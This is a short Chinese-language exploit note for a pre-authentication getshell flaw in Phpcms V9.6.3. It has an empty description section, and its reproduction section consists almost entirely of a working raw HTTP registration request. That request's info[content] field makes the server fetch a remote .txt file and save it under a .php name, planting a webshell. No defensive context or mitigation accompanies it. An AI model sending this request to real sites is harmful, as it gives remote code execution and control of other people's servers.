Phpcms V9.6.3 前台getshell
==========================

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.3

三、复现过程
------------

    POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
    Host: www.0-sec.org
    Content-Length: 297
    Cache-Control: max-age=0
    Origin: http://www.0-sec.org
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Referer: http://www.0-sec.org/index.php?m=member&c=index&a=register&siteid=1
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.8,es;q=0.6,fr;q=0.4,vi;q=0.2
    Cookie: PHPSESSID=h5jo0216vveqr9blnh146tq5q5
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    X-Originating-IP: 127.0.0.1
    Connection: close

    siteid=1&modelid=2&username=520520&password=5205201&pwdconfirm=5205201&email=52052096%40163.com&nickname=52096&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=&info[content]=<img src=http://wwww.0-sec.org/xxx.txt?.php#.jpg>
